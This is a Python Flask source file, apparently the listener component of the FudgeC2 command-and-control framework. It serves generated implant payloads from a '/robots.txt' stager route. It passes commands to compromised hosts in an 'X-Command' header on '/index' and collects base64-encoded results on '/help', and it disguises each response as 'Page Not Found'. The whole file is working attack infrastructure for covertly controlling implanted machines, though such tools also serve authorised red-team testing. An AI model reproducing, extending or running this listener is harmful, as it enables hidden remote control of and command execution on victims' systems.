from flask import Flask, render_template, flash, request, jsonify, g, current_app,url_for, redirect, make_response, send_file, send_from_directory
import base64
from uuid import uuid4
from FudgeC2.Implant.Implant import ImplantSingleton
from FudgeC2.Data.Database import Database

Imp=ImplantSingleton.instance
db=Database()

app = Flask(str(uuid4()))
app.config['SECRET_KEY'] = str(uuid4())

def ImplantManager(a):
    if "X-Implant" in a:
        print("Checked in implant is: ",a["X-Implant"])

@app.before_request
def before_request():
    # TODO: Implement IP whitelist and reject if connection if it is not a valid src IP.
    return

@app.after_request
def add_header( r):
    #r.headers["X-Command"] = a
    return r


# -- TODO: extracted and added into a new stager specific listener(?)
@app.route("/robots.txt",methods=['GET'])
def Stager():
    # This endpoint is responsible for generating the implant based on stager callbacks
    implant_data = db.Register_NewImplantFromStagerKey(request.values['user'])
    if implant_data:
        output_from_parsed_template = Imp.GeneratePayload(implant_data)
        return output_from_parsed_template
    else:
        return "404", 404

@app.route("/index", methods=['GET','POST'])
def ImplantCheckIn():
    # Should check ANY connection in against all configured implant options (IE body, header etc)
    #   unlike they 'headers' options which is configured in the current iteration.
    if 'X-Implant' in request.headers:
        CmdToExecute = Imp.IssueCommand(request.headers['X-Implant'], app.config['listener_type'])
        Resp = make_response("Page Not Found.")
        # if CmdToExecute !="==":
        #     print("ImplantCheckIn: ",CmdToExecute)
        Resp.headers["X-Command"] = CmdToExecute
    else:
        Resp = make_response("Page Not Found")
        Resp.headers["X-Command"] = "=="
    return Resp

@app.route("/help",methods=['GET','POST'])
def ImplantCommandResult():
    # -- X-Result is a placeholder header and should be changed to a more realistic value
    if "X-Result" in request.headers:
        DecodedResponse = base64.b64decode(request.headers["X-Result"]).decode('utf-16').split("::", 1)
        Imp.CommandResponse(DecodedResponse[0], DecodedResponse[1], app.config['listener_type'])
    return "Page Not Found"


@app.route("/aaa",methods=["GET"])
def testing():
    print(0)

